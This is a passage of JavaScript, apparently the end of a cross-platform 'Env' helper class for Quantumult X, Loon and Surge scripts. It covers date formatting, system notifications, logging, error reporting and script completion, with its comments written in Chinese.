      if (/(y+)/.test(fmt))
        fmt = fmt.replace(
          RegExp.$1,
          (date.getFullYear() + '').substr(4 - RegExp.$1.length)
        );
      for (let k in o)
        if (new RegExp('(' + k + ')').test(fmt))
          fmt = fmt.replace(
            RegExp.$1,
            RegExp.$1.length == 1
              ? o[k]
              : ('00' + o[k]).substr(('' + o[k]).length)
          );
      return fmt;
    }

    /**
     * 系统通知
     *
     * > 通知参数: 同时支持 QuanX 和 Loon 两种格式, EnvJs根据运行环境自动转换, Surge 环境不支持多媒体通知
     *
     * 示例:
     * $.msg(title, subt, desc, 'twitter://')
     * $.msg(title, subt, desc, { 'open-url': 'twitter://', 'media-url': 'https://github.githubassets.com/images/modules/open_graph/github-mark.png' })
     * $.msg(title, subt, desc, { 'open-url': 'https://bing.com', 'media-url': 'https://github.githubassets.com/images/modules/open_graph/github-mark.png' })
     *
     * @param {*} title 标题
     * @param {*} subt 副标题
     * @param {*} desc 通知详情
     * @param {*} opts 通知参数
     *
     */
    msg(title = name, subt = '', desc = '', opts) {
      const toEnvOpts = (rawOpts) => {
        if (!rawOpts) return rawOpts;
        if (typeof rawOpts === 'string') {
          if (this.isLoon()) return rawOpts;
          else if (this.isQuanX()) return { 'open-url': rawOpts };
          else if (this.isSurge()) return { url: rawOpts };
          else return undefined;
        } else if (typeof rawOpts === 'object') {
          if (this.isLoon()) {
            let openUrl = rawOpts.openUrl || rawOpts.url || rawOpts['open-url'];
            let mediaUrl = rawOpts.mediaUrl || rawOpts['media-url'];
            return { openUrl, mediaUrl };
          } else if (this.isQuanX()) {
            let openUrl = rawOpts['open-url'] || rawOpts.url || rawOpts.openUrl;
            let mediaUrl = rawOpts['media-url'] || rawOpts.mediaUrl;
            let updatePasteboard =
              rawOpts['update-pasteboard'] || rawOpts.updatePasteboard;
            return {
              'open-url': openUrl,
              'media-url': mediaUrl,
              'update-pasteboard': updatePasteboard,
            };
          } else if (this.isSurge()) {
            let openUrl = rawOpts.url || rawOpts.openUrl || rawOpts['open-url'];
            return { url: openUrl };
          }
        } else {
          return undefined;
        }
      };
      if (!this.isMute) {
        if (this.isSurge() || this.isLoon()) {
          $notification.post(title, subt, desc, toEnvOpts(opts));
        } else if (this.isQuanX()) {
          $notify(title, subt, desc, toEnvOpts(opts));
        }
      }
      if (!this.isMuteLog) {
        let logs = ['', '==============📣系统通知📣=============='];
        logs.push(title);
        subt ? logs.push(subt) : '';
        desc ? logs.push(desc) : '';
        console.log(logs.join('\n'));
        this.logs = this.logs.concat(logs);
      }
    }

    log(...logs) {
      if (logs.length > 0) {
        this.logs = [...this.logs, ...logs];
      }
      console.log(logs.join(this.logSeparator));
    }

    logErr(err, msg) {
      const isPrintSack = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      if (!isPrintSack) {
        this.log('', `❗️${this.name}, 错误!`, err);
      } else {
        this.log('', `❗️${this.name}, 错误!`, err.stack);
      }
    }

    wait(time) {
      return new Promise((resolve) => setTimeout(resolve, time));
    }

    done(val = {}) {
      const endTime = new Date().getTime();
      const costTime = (endTime - this.startTime) / 1000;
      this.log('', `🔔${this.name}, 结束! 🕛 ${costTime} 秒`);
      this.log();
      if (this.isSurge() || this.isQuanX() || this.isLoon()) {
        $done(val);
      }
    }
  })(name, opts);
}